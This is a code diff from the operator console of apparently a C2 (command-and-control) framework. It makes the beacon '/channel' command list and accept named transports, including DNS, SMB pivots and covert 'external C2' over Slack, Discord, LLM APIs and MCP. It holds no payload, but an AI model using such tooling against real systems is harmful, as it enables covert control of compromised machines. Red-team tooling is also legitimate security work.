@@ -2052,7 +2052,57 @@ impl App {
                     self.log("! select a beacon first", Level::Err);
                     return;
                 };
-                let ch: u8 = args.trim().parse().unwrap_or(0);
+                let trimmed = args.trim();
+                if trimmed.is_empty() {
+                    // No argument — list all available channels with their IDs.
+                    self.log("C2 transport channels:", Level::Info);
+                    self.log("  0 https   — HTTPS POST (default)", Level::Info);
+                    self.log("  1 doh     — DNS-over-HTTPS", Level::Info);
+                    self.log("  2 dns     — DNS beacon", Level::Info);
+                    self.log("  3 smb     — SMB Named Pipe (pivot)", Level::Info);
+                    self.log("  4 tcp     — TCP Beacon (pivot)", Level::Info);
+                    self.log("  5 slack   — External C2 via Slack", Level::Info);
+                    self.log("  6 llm     — External C2 via LLM API", Level::Info);
+                    self.log("  7 mcp     — External C2 via MCP", Level::Info);
+                    self.log("  8 discord — External C2 via Discord", Level::Info);
+                    self.log("usage: /channel <id|name>  e.g. /channel doh", Level::Info);
+                    return;
+                }
+                // Accept either a numeric ID (0-8) or a channel name.
+                let ch: u8 = if let Ok(n) = trimmed.parse::<u8>() {
+                    n
+                } else {
+                    match trimmed.to_ascii_lowercase().as_str() {
+                        "https" | "http" => 0,
+                        "doh" | "dohdns" | "doh-dns" => 1,
+                        "dns" => 2,
+                        "smb" | "smbpipe" | "smb-pipe" | "pipe" => 3,
+                        "tcp" => 4,
+                        "slack" | "slackapi" | "slack-api" => 5,
+                        "llm" | "llmapi" | "llm-api" => 6,
+                        "mcp" => 7,
+                        "discord" | "discordapi" | "discord-api" => 8,
+                        _ => {
+                            self.log(
+                                &format!("! unknown channel '{trimmed}'. /channel for list."),
+                                Level::Err,
+                            );
+                            return;
+                        }
+                    }
+                };
+                if ch > 8 {
+                    self.log("! channel ID must be 0-8. /channel for list.", Level::Err);
+                    return;
+                }
+                let names = [
+                    "HTTPS", "DoH-DNS", "DNS", "SMB Pipe", "TCP",
+                    "Slack API", "LLM API", "MCP", "Discord API",
+                ];
+                self.log(
+                    &format!("switching to {} ({})", ch, names.get(ch as usize).unwrap_or(&"?")),
+                    Level::Info,
+                );
                 self.send(Cmd::SetChannel {
                     session: s.id,
                     channel: ch,
